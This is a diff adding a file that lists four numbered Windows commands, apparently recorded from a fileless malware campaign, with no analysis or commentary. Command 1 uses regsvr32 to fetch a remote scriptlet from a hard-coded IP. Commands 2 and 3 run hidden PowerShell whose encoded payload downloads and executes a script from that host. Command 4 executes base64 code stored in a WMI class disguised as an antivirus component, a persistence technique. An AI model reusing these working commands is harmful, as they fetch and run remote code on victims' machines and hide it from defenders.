@@ -1,0 +1,11 @@
+1的命令
+C:\Windows\system32\regsvr32.EXE /u /s /i:http://185.128.43.62/antivirus.php scrobj.dll
+
+2的命令
+"C:\Windows\System32\cmd.exe" /c powershell.exe -nop -noni -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADgANQAuADEAMgA4AC4ANAAzAC4ANgAyADoANAA0ADMALwBhAG4AdABpAHYAaQByAHUAcwAuAHAAcwAxACcAKQApAAoA
+
+3的命令
+powershell.exe  -nop -noni -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADgANQAuADEAMgA4AC4ANAAzAC4ANgAyADoANAA0ADMALwBhAG4AdABpAHYAaQByAHUAcwAuAHAAcwAxACcAKQApAAoA
+
+4的命令
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -NonI -W Hidden "$mon = ([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['mon'].Value;$funs = ([WmiClass] 'root\default:System_Anti_Virus_Core').Properties['funs'].Value ;iex ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($funs)));Invoke-Command  -ScriptBlock $RemoteScriptBlock -ArgumentList @($mon, $mon, 'Void', 0, '', '')"
